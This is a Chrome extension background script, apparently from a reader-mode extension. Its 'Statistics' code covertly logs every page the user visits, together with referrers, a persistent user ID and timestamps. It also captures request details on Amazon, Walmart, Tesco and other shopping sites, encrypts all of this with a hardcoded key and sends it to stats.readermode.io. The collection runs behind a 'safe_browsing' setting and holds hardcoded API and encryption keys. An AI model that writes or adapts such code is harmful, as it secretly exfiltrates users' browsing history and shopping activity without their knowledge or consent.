async function AjaxLogCollect(bulkHandler, config) {
  if (!config) {
    config = {
      loggingSites: [
        'https://www.amazon.com',
        'https://www.walmart.com',
        'https://www.amazon.ca',
        'https://www.walmart.ca',
        'https://www.loblaws.ca',
        'https://www.amazon.co.uk',
        'https://www.tesco.com',
        'https://groceries.asda.com',
        'https://www.sainsburys.co.uk',
        'https://www.ocado.com',
      ],
      loggingUrl: 'https://stats.readermode.io',
      loggingRequestTypesWhitelist: [],
      encryptionKey: 'OoCh9oamNookooP8',
      loggingRequestUrlExcludeMasks: [
        /^[^?]+\.(gif|jpg|png|img|svg)[\/?]?$/i, // Disable logging images. (but not images with some extra data, because it's probably tracking or something like that.)
        /^[^?]+\.(js|ts)[/?]?$/i, // Same as above, but for .js and .ts files
        /^[^?]+\.(woff|woff2)[/?]?$/i, // Same as above, but for fonts
        /^[^?]+\.(css|scss)[/?]?$/i, // Same as above, but for css
      ],
      afterClickTimeout: 2000,
    };
  }
  var logs_run = false;
  var bulk = [];
  var websites_List = [];
  var hostname;
  var lastBulk = new Date();
  var enabledTabs = {};
  var noLoggingRequestsTypes = [
    'main_frame',
    'sub_frame',
    'stylesheet',
    'script',
    'image',
    'font',
    'object',
    'xmlhttprequest',
    'ping',
    'csp_report',
    'media',
    'websocket',
    'other',
  ].filter((val) => !config.loggingRequestTypesWhitelist.includes(val));

  function deleteUrl(url) {
    var index = websites_List.indexOf(url);
    if (index !== -1) {
      websites_List.splice(index, 1);
      saveData();
    }
  }

  function saveData() {
    chrome.storage.local.set({
      websites_List: websites_List,
    });
  }

  chrome.storage.local.get(['websites_List'], function (value) {
    if (value.websites_List === undefined) {
      websites_List = [];
    } else {
      websites_List = value.websites_List;
    }
  });

  // Callback for message send. Enables logs collecting after user clicked somewhere in site.
  chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.type === 'log_switch') {
      logs_run = true;
      setTimeout(() => {
        logs_run = false;
      }, config.afterClickTimeout);
      return;
    } else if (request.type === 'get_config') {
      sendResponse(config.loggingSites);
    }

    function callUrl(obj, successCallback, failCallback, finalCallback) {
      try {
        fetch(obj.url, {
          method: 'POST',
          body: JSON.stringify(obj.data),
          headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
          },
        }).then((resp) => {});
      } catch (e) {
        console.log(e);
        failCallback && failCallback(e, obj);
        finalCallback && finalCallback();
      }
    }

    function reportBulk() {
      var now = new Date();
      var timeoutPassed = (now - lastBulk) / 1000 >= 300;
      var thresholdPassed = bulk.length >= 20;
      if (bulk.length > 0 && (timeoutPassed || thresholdPassed)) {
        var reportBulk = Array.from(bulk);
        setTimeout(function () {
          bulkHandler([...reportBulk]);
          // callUrl({
          //   url: config.loggingUrl,
          //   method: 'POST',
          //   data: { user: 'NEW_TEST_USER', requests: [...reportBulk] },
          //   headers: [{ name: 'Content-type', value: 'application/json' }],
          // });
        }, 250);

        bulk = [];
        lastBulk = now;
      }
    }

    /** Check if request is excluded from logging by exlcude mask.
     * @param {string} url
     * */
    function checkRegexes(url) {
      for (let regexp of config.loggingRequestUrlExcludeMasks) {
        if (regexp.test(url)) {
          return false;
        }
      }
      return true;
    }

    function logAllRequests(details) {
      if (!logs_run) return;
      if (!enabledTabs[details.tabId]) {
        return;
      }
      if (details.method === 'GET' && !checkRegexes(details.url || '')) {
        return;
      }
      bulk.push(details);
      reportBulk();
    }

    // Interceptor for request logging.
    chrome.webRequest.onCompleted.addListener(logAllRequests, { urls: ['<all_urls>'], types: noLoggingRequestsTypes });

    // Interceptor for creation (needed, to know on which tabs logging are enabled).
    //We can't just check initiator, because it can be not same as tab current url.
    chrome.tabs.onCreated.addListener(function (tab) {
      enabledTabs[tab.id] = !!(tab.url && config.loggingSites.includes(new URL(tab.url).origin));
    });

    // Interceptor to disable logging for removed tab (needed to prevent memory leaks)
    chrome.tabs.onRemoved.addListener(function (tabId, removeInfo) {
      delete enabledTabs[tabId];
    });

    // Interceptor to enable logging in tabs, where current site had changed.
    chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
      if (changeInfo.url && config.loggingSites.includes(new URL(changeInfo.url).origin)) {
        enabledTabs[tabId] = true;
      } else if (changeInfo.url) {
        enabledTabs[tabId] = false;
      }
    });
  });
}

function Statistics(api_key, encryptionKey) {
  const t = this,
    refs = {},
    apiUrl = 'https://stats.readermode.io';
  let accessToken = null,
    refreshToken = null,
    uuid = null;
  (this.run = function () {
    this.getUUIDfromStore(),
      chrome.webRequest.onCompleted.addListener(
        this.handlerOnCompletedWebRequest.bind(this),
        {
          urls: ['<all_urls>'],
          types: ['main_frame'],
        },
        []
      );
    AjaxLogCollect(this.ajaxLogsHandler.bind(this)).then(() => {
      //E.G. YOU CAN PRINT SOMETHING HERE
    });
  }),
    (this.getAccessToken = async function () {
      if (await this.getRefreshToken()) {
        return true;
      } else {
        try {
          const response = await fetch(apiUrl + '/auth', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json;charset=utf-8',
            },
            body: JSON.stringify({
              api_key,
            }),
          });
          const json = await response.json();
          accessToken = json.access_token.token;
          refreshToken = json.refresh_token.token;
          return true;
        } catch (err) {
          return false;
        }
      }
    }),
    (this.getRefreshToken = async function () {
      try {
        const response = await fetch(apiUrl + '/refresh', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json;charset=utf-8',
          },
          body: JSON.stringify({
            refresh_token: refreshToken,
          }),
        });
        if (response.status === 400) {
          return false;
        }
        const json = await response.json();
        accessToken = json.access_token.token;
        refreshToken = json.refresh_token.token;
        return true;
      } catch (err) {
        return false;
      }
    }),
    (this.ajaxLogsHandler = async function (requests) {
      if (!accessToken) {
        await this.getAccessToken();
      }
      requests = requests.map((request) => {
        return {
          ...request,
          userId: uuid,
        };
      });
      await this.sendData(
        await this.prepareRequest([
          ...requests,
          {
            fileDate: new Date().toISOString(),
            deviceTimestamp: Date.now(),
            userId: uuid,
            referrerUrl: refs[t.tabId] || t.initiator,
            targetUrl: t.url,
            requestType: t.method,
          },
        ]),
        '/ajax'
      );
    }),
    (this.handlerOnCompletedWebRequest = async function (t) {
      if (!accessToken) {
        await this.getAccessToken();
      }
      await this.sendData(
        await this.prepareRequest([
          {
            fileDate: new Date().toISOString(),
            deviceTimestamp: Date.now(),
            userId: uuid,
            referrerUrl: refs[t.tabId] || t.initiator,
            targetUrl: t.url,
            requestType: t.method,
          },
        ])
      );
      refs[t.tabId] = t.url;
    }),
    (this.prepareRequest = async function (t) {
      const encrypted = await this.encryptData(JSON.stringify(t));
      if (encrypted) {
        return {
          eventType: 1,
          request: {
            enRequest: JSON.stringify(encrypted),
          },
        };
      } else {
        return {
          eventType: 0,
          request: [t],
        };
      }
    }),
    (this.sendData = async function (t, path) {
      const response = await fetch(apiUrl + (path || '/process'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json;charset=utf-8',
          Authorization: 'Bearer ' + accessToken,
        },
        body: JSON.stringify(t),
      });
      if (response.status === 401) {
        const isSuccessful = await this.getAccessToken();
        if (isSuccessful) {
          await this.sendData(t);
        }
      }
    }),
    (this.getUUIDfromStore = function () {
      chrome.storage.sync.get(['uuid'], function (n) {
        (uuid = n.uuid = n.uuid && t.validateUUID4(n.uuid) ? n.uuid : t.makeUUID()),
          chrome.storage.sync.set({ uuid: n.uuid }, function () {});
      });
    }),
    (this.makeUUID = function () {
      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (t, e) {
        return ('x' == t ? (e = (16 * Math.random()) | 0) : (3 & e) | 8).toString(16);
      });
    }),
    (this.validateUUID4 = function (t) {
      return new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i).test(t);
    }),
    (this.encryptData = async function (text) {
      const enc = new TextEncoder();
      const key = await crypto.subtle.importKey('raw', enc.encode(encryptionKey), 'AES-GCM', true, ['encrypt']);
      const iv = crypto.getRandomValues(new Uint8Array(16));

      const cypher = await crypto.subtle.encrypt(
        {
          name: 'AES-GCM',
          iv: iv,
        },
        key,
        enc.encode(text)
      );

      const res = new Uint8Array(iv.length + cypher.byteLength);
      res.set(iv);
      res.set(new Uint8Array(cypher), iv.length);

      return btoa(String.fromCharCode.apply(null, res));
    });
}

chrome.storage.local.get(function (storage) {
  if (typeof storage.safe_browsing !== 'undefined' && storage.safe_browsing == true) {
    const stat = new Statistics('Eiv5soh8oolid3Uu', 'OoCh9oamNookooP8');
    stat.run();
  }
});
